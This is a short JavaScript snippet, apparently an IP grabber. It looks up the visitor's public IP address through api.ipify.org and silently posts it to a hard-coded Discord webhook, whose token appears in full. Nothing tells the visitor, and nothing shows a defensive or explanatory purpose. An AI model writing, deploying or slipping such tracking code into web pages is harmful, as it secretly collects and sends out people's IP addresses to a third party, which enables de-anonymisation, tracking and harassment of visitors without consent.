var ip = '';
fetch('https://api.ipify.org/?format=json')
.then(function(response) {
    return response.json();
})
.then(function(data) {
    ip = data.ip; 
    var webhook = 'https://discord.com/api/webhooks/1247216207510241384/gqzMJwlCX7rOpOilV3WMDK1y-TKLxEL4q1FsysyoF7sHaDvvV37wCeqONN5eAlPByl7V'
    var message = {
        content: 'IP:' + ip 
    };

    fetch(webhook,{
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(message)
    });
});